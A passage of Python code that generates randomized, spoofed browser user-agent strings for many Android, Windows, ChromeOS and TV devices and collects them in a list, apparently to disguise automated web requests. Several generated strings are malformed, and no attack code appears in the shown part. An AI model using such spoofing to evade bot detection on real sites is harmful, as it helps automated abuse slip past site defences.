        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 9;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Redmi Note 10 Pro'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 10;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Redmi Note 7S'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/83.0.4103.101 Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 7.0;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Redmi Note 4 Build/NRD90M)'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 13;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Vivo Y91C)'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 13;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Redmi Note 10 Pro'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Windows NT 10.0; Win64;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Windows NT 10.0; Win64'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/109.0.0.0 Safari/537.36 Edg/108.0.1462.76'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (X11; CrOS x86_64 15183.78.0;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'X11; CrOS x86_64 15183.78.0'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/108.0.5359.172 Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (X11; CrOS armv7l 15183.78.0;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'X11; CrOS armv7l 15183.78.0'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/108.0.5359.172 Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (X11; CrOS aarch64 15183.78.0;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'X11; CrOS aarch64 15183.78.0'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/108.0.5359.172 Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 12; SM-A135F;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Linux; Android 12; SM-A135F'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/108.0.0.0 Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/E7FBAF'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Android 10; Xiaomi Redmi Note 9 Pro Max;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Android 10; Xiaomi Redmi Note 9 Pro Max'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/30.0.0.0 Mobile Safari/537.36 SurfBrowser/3.0'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Windows NT 10.0;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Windows NT 10.0'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/109.0.0.0 Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Windows NT 10.0;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Windows NT 10.0; WOW64; Trident/7.0; rv:11.0'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'like Gecko'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Windows NT 10.0; Win64; x64'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/109.0.0.0 Safari/537.36 Edg/108.0.1462.76'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Windows NT 10.0; Win64; x64'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/109.0.0.0 Safari/537.36 Vivaldi/5.6.2867.50'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Windows NT 10.0; Win64; x64; rv:108.0'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Gecko/20100101 Firefox/108.0'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Linux; Android 6.0.1; SM-G532G Build/MMB29T'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/63.0.3239.83 Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G991B;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Linux; Android 12; SAMSUNG SM-G991B'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (SMART-TV; Linux; Tizen 2.4.0;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'SMART-TV; Linux; Tizen 2.4.0'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'SamsungBrowser/1.1 tv Safari/538.1'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900P Build/LRX21T;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Linux; Android 5.0; SAMSUNG SM-G900P Build/LRX21T'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/E7FBAF'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SCH-I545 4G Build/LRX22C;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Linux; Android 5.0.1; SAMSUNG SCH-I545 4G Build/LRX22C'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/E7FBAF'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900P Build/LRX21V;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Linux; Android 5.0; SAMSUNG SM-N900P Build/LRX21V'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/E7FBAF'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A515F;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Linux; Android 11; SAMSUNG SM-A515F'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
